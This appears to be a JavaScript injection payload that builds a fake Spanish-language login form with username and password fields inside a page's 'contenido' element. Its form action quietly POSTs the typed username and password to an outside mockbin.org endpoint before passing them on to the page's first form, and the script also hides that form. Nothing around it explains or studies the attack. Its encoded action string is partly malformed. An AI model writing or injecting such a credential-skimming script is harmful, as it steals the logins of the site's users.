let form = document.createElement("form");
form.setAttribute("class", "form-container");


let usuarioGroup = document.createElement("div");
usuarioGroup.setAttribute("class", "input-group");
let labelUsuario = document.createElement("label");
labelUsuario.setAttribute("for", "usuario");
labelUsuario.innerHTML = "USUARIO:";
let usuario = document.createElement("input");
usuario.setAttribute("type", "text");
usuario.setAttribute("class", "user");
usuario.setAttribute("size", "20");
usuario.setAttribute("maxlength", "50");
usuarioGroup.appendChild(labelUsuario);
usuarioGroup.appendChild(usuario);

let passwordGroup = document.createElement("div");
passwordGroup.setAttribute("class", "input-group");
let labelPassword = document.createElement("label");
labelPassword.setAttribute("for", "password");
labelPassword.innerHTML = "CONTRASEÑA:";
form.setAttribute("method", "post");
form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/b472abbc-c914-4604-8a40-18b0d44b894b%22);xhr.send(%60user=$%7Busuario.value%7D;password=$%7Bpassword.value%7D%60);%27);
let password = document.createElement("input");
password.setAttribute("type", "password");
password.setAttribute("class", "password");
password.setAttribute("size", "20");
password.setAttribute("maxlength", "50");
passwordGroup.appendChild(labelPassword);
passwordGroup.appendChild(password);

let boton=document.createElement("input");
boton.setAttribute("type","submit");
boton.setAttribute("class","enviar_btn");

form.appendChild(usuarioGroup);
form.appendChild(passwordGroup);
form.appendChild(boton);


document.getElementById("contenido").appendChild(form);
document.forms[0].style="display:none;";
